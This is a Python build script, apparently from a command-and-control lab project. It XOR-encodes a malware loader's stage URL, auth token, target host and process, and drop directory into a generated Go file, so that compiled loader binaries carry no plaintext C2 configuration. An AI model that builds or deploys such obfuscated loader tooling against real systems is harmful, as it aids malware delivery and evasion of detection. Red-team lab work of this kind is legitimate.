#!/usr/bin/env python3
"""Regenerate xor_secrets.go in a BUILD tree with XOR-obfuscated loader config.

Why: the loader used to carry its C2 config as {{TEMPLATE}} placeholders that
the build substituted as plaintext (stage URL, auth token, target host/proc,
drop dir). Baking them instead XOR-encodes every value with the shared key so
the compiled loader.exe / loader.dll carry no plaintext C2 config. Runtime
env vars (C2_STAGE_URL, STAGE_AUTH_TOKEN, ...) still override baked values.

This script only touches the build tree — loader/xor_secrets.go in the
template tree stays EMPTY (all defaults).

Usage:
  # values come from the process environment (build.sh sources
  # config.lab.env before invoking):
  python3 scripts/bake_loader_secrets.py --out .build/loader/xor_secrets.go

  # or from an env file (double-backslashes are unescaped):
  python3 scripts/bake_loader_secrets.py --env config.lab.env \
      --out .build/loader/xor_secrets.go

Baked values (env var -> Go variable):
  C2_STAGE_URL     -> eBakedStageURL
  STAGE_AUTH_TOKEN -> eBakedStageToken
  STAGE_INSECURE   -> eBakedStageInsecure
  TARGET_HOST      -> eBakedTargetHost
  TARGET_PROC      -> eBakedTargetProc
  STAGE_MODE       -> eBakedStageMode
  STAGE_DROP_DIR   -> eBakedDropDir

Empty values are baked as empty (xob() returns "") and the loader falls back
to its compiled defaults — the Go file always compiles.
"""
import argparse
import os
import re
import sys

KEY = b"0p3nc0de-c2lab-x0r"

# (Go variable, env var, accessor name, human label)
FIELDS = (
    ("eBakedStageURL", "C2_STAGE_URL", "bakedStageURL", "stage_url"),
    ("eBakedStageToken", "STAGE_AUTH_TOKEN", "bakedStageToken", "stage_token"),
    ("eBakedStageInsecure", "STAGE_INSECURE", "bakedStageInsecure", "stage_insecure"),
    ("eBakedTargetHost", "TARGET_HOST", "bakedTargetHost", "target_host"),
    ("eBakedTargetProc", "TARGET_PROC", "bakedTargetProc", "target_proc"),
    ("eBakedStageMode", "STAGE_MODE", "bakedStageMode", "stage_mode"),
    ("eBakedDropDir", "STAGE_DROP_DIR", "bakedDropDir", "drop_dir"),
)

GO_TEMPLATE = """// Baked loader secrets (XOR-obfuscated with xobKey from xor.go).
// GENERATED by scripts/bake_loader_secrets.py — do not edit by hand, do not
// copy back into the loader/ template tree.
package main

var (
{vars}
)

{accessors}
"""


def xor_encode(s: str) -> bytes:
    raw = s.encode("utf-8")
    enc = bytes([b ^ KEY[i % len(KEY)] for i, b in enumerate(raw)])
    # Roundtrip guard: decode with the same scheme xob() uses. If this ever
    # drifts from loader/xor.go, every baked value silently becomes garbage.
    dec = bytes([c ^ KEY[i % len(KEY)] for i, c in enumerate(enc)])
    if dec != raw:
        raise RuntimeError("roundtrip failed for %r" % s[:12])
    return enc


def go_literal(enc: bytes) -> str:
    if not enc:
        return '[]byte("")'
    return '[]byte("' + "".join(f"\\x{b:02x}" for b in enc) + '")'


def load_env_file(path):
    vals = {}
    with open(path, "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            m = re.match(r'(?:export\s+)?([A-Za-z_][A-Za-z0-9_]*)\s*=\s*"?([^"\n]*)"\s*$', line)
            if m:
                # Env files store Windows paths with doubled backslashes
                # (bash escaping); unescape so the baked value is literal.
                vals[m.group(1)] = m.group(2).strip().replace("\\\\", "\\")
    return vals


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--env", help="env file to read (e.g. config.lab.env); process env wins")
    ap.add_argument("--out", required=True, help="output xor_secrets.go path (build tree)")
    args = ap.parse_args()

    file_vals = load_env_file(args.env) if args.env else {}

    out_vars, baked, empty = [], [], []
    for var, env, acc, label in FIELDS:
        val = os.environ.get(env, "") or file_vals.get(env, "")
        if val:
            out_vars.append(f"\t{var} = {go_literal(xor_encode(val))}")
            baked.append(label)
            print(f"[*] baked {env} -> {var} ({len(val)} bytes, XOR)")
        else:
            out_vars.append(f"\t{var} = []byte(\"\")")
            empty.append(label)

    accessors = "\n".join(
        f"func {acc}() string {{ return xob({var}) }}" for var, _, acc, _ in FIELDS
    )
    src = GO_TEMPLATE.format(vars="\n".join(out_vars), accessors=accessors)

    out_dir = os.path.dirname(args.out) or "."
    os.makedirs(out_dir, exist_ok=True)
    with open(args.out, "w", encoding="utf-8") as f:
        f.write(src)

    print(f"[*] wrote {args.out}")
    print(f"[*] baked: {', '.join(baked) if baked else 'NOTHING (loader runs on defaults)'}")
    if empty:
        print(f"[*] empty: {', '.join(empty)}")
    if not (os.environ.get("C2_STAGE_URL") or file_vals.get("C2_STAGE_URL")):
        print("[!] WARNING: no C2_STAGE_URL baked — loader stager is a no-op unless the env var is set at runtime", file=sys.stderr)
    return 0


if __name__ == "__main__":
    sys.exit(main())
